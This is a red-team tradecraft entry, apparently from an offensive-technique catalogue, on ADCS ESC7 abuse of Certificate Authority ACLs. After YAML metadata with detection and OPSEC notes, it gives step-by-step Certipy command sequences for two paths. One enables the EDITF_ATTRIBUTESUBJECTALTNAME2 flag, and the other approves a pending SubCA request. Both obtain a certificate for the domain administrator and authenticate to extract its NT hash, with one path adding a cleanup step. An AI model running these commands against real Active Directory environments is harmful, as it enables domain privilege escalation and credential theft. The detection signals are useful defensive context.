---
name: ADCS ESC7 — CA ACL Abuse
category: adcs
subcategories: [esc7, ca-acl-abuse, manage-ca-rights]
tradecraft_tags: [adcs, esc7, ca-acl, manage-ca, manage-certificates, certipy, ca-backdoor]
mitre_attack:
  - id: T1649
    name: Steal or Forge Authentication Certificates
source:
  url: https://posts.specterops.io/certified-pre-owned-d95910965cd2
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  CA permission modification generates Event 4897 (CA properties changed) on the CA
  server. Certificate issuance with the Manage Certificates right generates additional
  CA audit events. Certipy's ESC7 exploitation path generates LDAPS-level CA management
  traffic.
usage_examples:
  - description: Detect ESC7 — check if low-priv user has ManageCA or ManageCertificates
    args: "certipy find -u user -p pass -dc-ip DC_IP -vulnerable"
  - description: Exploit ESC7 — add ENROLLEE_SUPPLIES_SUBJECT via ManageCA
    args: "certipy ca -u user -p pass -dc-ip DC_IP -ca CANAME -add-officer attacker"
  - description: ESC7 path 2 — approve pending certificate requests (ManageCertificates)
    args: "certipy req -u attacker -p pass -dc-ip DC_IP -ca CANAME -template SubCA -upn administrator@domain.local"
opsec_notes: |
  ESC7 requires CA-level write access (ManageCA or ManageCertificates), which is more
  privileged than template-level ESC1-4. If a low-priv user has these CA rights (via
  direct ACL grant or group membership), they can:
  - ManageCA: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag (converts CA to ESC6 state)
  - ManageCertificates: Approve PENDING certificate requests (bypass manager approval)
  Combined, these enable CA-level backdooring.
gotchas: |
  ESC7 with ManageCA path:
    1. Add EDITF_ATTRIBUTESUBJECTALTNAME2 flag to CA (converts to ESC6)
    2. Request cert with arbitrary SAN from any template
    3. Remove the flag after exploitation (cleanup)
  
  ESC7 with ManageCertificates path:
    1. Request cert from SubCA template (normally requires CA manager approval)
    2. Certificate enters PENDING state
    3. Use ManageCertificates right to approve the pending request
    4. Certificate issued — extract and use for PKINIT
  
  Certipy handles both paths. Certify v1 did NOT support ESC7; Certipy is the tool
  of choice.
related_ttps: [certipy, certify-v2, adcs-esc6, adcs-esc8, rubeus, pspkiaudit]
alternatives: [pspkiaudit-ca-acl-check]
common_args: {}
last_updated: 2026-05-29
---

# ADCS ESC7 — CA ACL Abuse

ESC7 occurs when a low-privileged principal has `ManageCA` or `ManageCertificates`
rights on a Certificate Authority object. These rights are more powerful than template
ACLs (ESC4) because they allow modifying the CA's own configuration or approving
certificate requests.

## ESC7 Attack Paths

### Path 1: ManageCA → EDITF Flag → ESC6

```
1. Detect ManageCA on attacker-controlled principal:
   certipy find -vulnerable → "ManageCA: attacker@domain"

2. Add EDITF_ATTRIBUTESUBJECTALTNAME2 flag to CA:
   certipy ca -ca CANAME -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2 \
     -u attacker -p pass -dc-ip DC_IP

3. Request cert with arbitrary SAN (any template now = ESC1):
   certipy req -ca CANAME -template User -upn administrator@domain.local \
     -u attacker -p pass -dc-ip DC_IP

4. Authenticate and get NT hash:
   certipy auth -pfx administrator.pfx -domain domain.local

5. Clean up the EDITF flag:
   certipy ca -ca CANAME -disable-flag EDITF_ATTRIBUTESUBJECTALTNAME2 \
     -u attacker -p pass -dc-ip DC_IP
```

### Path 2: ManageCertificates → Approve Pending Requests

```
1. Detect ManageCertificates right

2. Request cert from SubCA template (requires approval):
   certipy req -ca CANAME -template SubCA -upn administrator@domain.local \
     -u attacker -p pass -dc-ip DC_IP
   → Certificate enters PENDING state with a request ID

3. Approve the pending request using ManageCertificates right:
   certipy ca -ca CANAME -issue-request <request_id> \
     -u attacker -p pass -dc-ip DC_IP

4. Retrieve the issued certificate:
   certipy req -ca CANAME -retrieve <request_id> \
     -u attacker -p pass -dc-ip DC_IP

5. Authenticate:
   certipy auth -pfx administrator.pfx
```

## Detection with Certify vs Certipy

- Certify v1: Does NOT detect ESC7 (only template-level checks)
- Certify v2: Partial detection
- Certipy: Full detection and exploitation of ESC7

Use Certipy for comprehensive ESC7 checking.
